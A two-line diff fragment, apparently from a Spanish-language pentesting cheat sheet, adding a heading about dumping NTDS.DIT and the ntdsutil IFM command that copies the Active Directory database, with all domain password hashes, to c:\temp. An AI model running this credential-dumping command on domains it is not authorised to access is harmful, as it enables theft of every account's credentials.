@@ -1,0 +1,2 @@
+▶ Volcar NTDS.DIT (Método 1 - Windows >= 2008 Server):
+  ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
